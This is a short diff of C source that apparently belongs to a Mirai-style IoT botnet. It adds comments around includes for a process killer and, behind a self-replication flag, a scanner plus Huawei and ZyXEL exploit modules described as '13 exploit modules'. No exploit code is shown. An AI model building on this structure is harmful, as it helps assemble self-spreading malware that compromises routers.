@@ -5,11 +5,15 @@
 #include "rand.h"
 #include "util.h"
 
+/* ============================================================================
+ * OPTIONAL MODULES - Enabled via config.h defines
+ * ============================================================================ */
 #ifdef KILLER
 #include "killer.h"
 #endif
 
 #ifdef SELFREP
+/* Self-replication scanners - 13 exploit modules */
 #include "scanner.h"
 #include "huawei.h"
 #include "zyxel.h"
